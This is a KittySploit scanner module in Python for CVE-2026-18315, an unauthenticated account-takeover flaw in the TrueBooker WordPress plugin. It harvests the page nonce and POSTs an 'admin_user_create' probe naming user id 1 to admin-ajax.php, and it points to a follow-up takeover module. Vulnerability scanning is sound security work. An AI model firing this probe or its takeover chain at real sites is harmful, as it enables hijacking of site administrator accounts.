#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""TrueBooker <= 1.2.6 unauthenticated admin_user_create (CVE-2026-18315)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "truebooker-appointment-booking"
_VULN_HIGH = (1, 2, 6)
_NONCE_RE = re.compile(
    r'ajax_object\s*=\s*\{[^}]*?"nonce"\s*:\s*"([a-zA-Z0-9]+)"',
    re.I,
)
_PROBE_PATHS = ("/", "/booking/", "/appointment/", "/schedule/")


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "TrueBooker CVE-2026-18315 detect",
        "description": (
            "Detects CVE-2026-18315: nopriv admin_user_create accepts attacker-controlled "
            "truebooker_wp_user_id (safe empty-field probe matches Nuclei)."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-18315",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-18315",
            "https://patchstack.com/database/wordpress/plugin/truebooker-appointment-booking/",
        ],
        "modules": ["auxiliary/admin/http/truebooker_cve_2026_18315_account_takeover"],
        "tags": ["web", "scanner", "wordpress", "truebooker", "auth-bypass", "cve-2026-18315"],
        "agent": {
            "approval_required": True,
            "chain": {
                "suggested_followups": ["auxiliary/admin/http/truebooker_cve_2026_18315_account_takeover"],
            },
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def _fetch_nonce(self) -> str:
        for rel in _PROBE_PATHS:
            page = self.http_request(method="GET", path=self._join(rel), allow_redirects=True)
            if not page or int(page.status_code or 0) != 200:
                continue
            match = _NONCE_RE.search(page.text or "")
            if match:
                return match.group(1)
        return ""

    def run(self):
        base = self.wp_normalize_base_path(self.base_path or "/")
        version = self.wp_plugin_version(_PLUGIN, base) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        nonce = self._fetch_nonce()
        if not nonce:
            if version and self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
                self.set_info(
                    severity="high",
                    reason="TrueBooker <= 1.2.6 present; front nonce not found",
                    cve="CVE-2026-18315",
                )
                return True
            return False
        probe = self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data={
                "action": "admin_user_create",
                "security": nonce,
                "alldata": "truebooker_wp_user_id=1",
            },
            allow_redirects=False,
        )
        body = probe.text or "" if probe else ""
        if probe and int(probe.status_code or 0) == 200 and all(
            x in body for x in ("fname-error-front", "tba-popconfirm", "truebooker_error")
        ):
            self.set_info(
                severity="critical",
                reason="TrueBooker admin_user_create nopriv AJAX exposed",
                path="/wp-admin/admin-ajax.php",
                cve="CVE-2026-18315",
            )
            return True
        return False
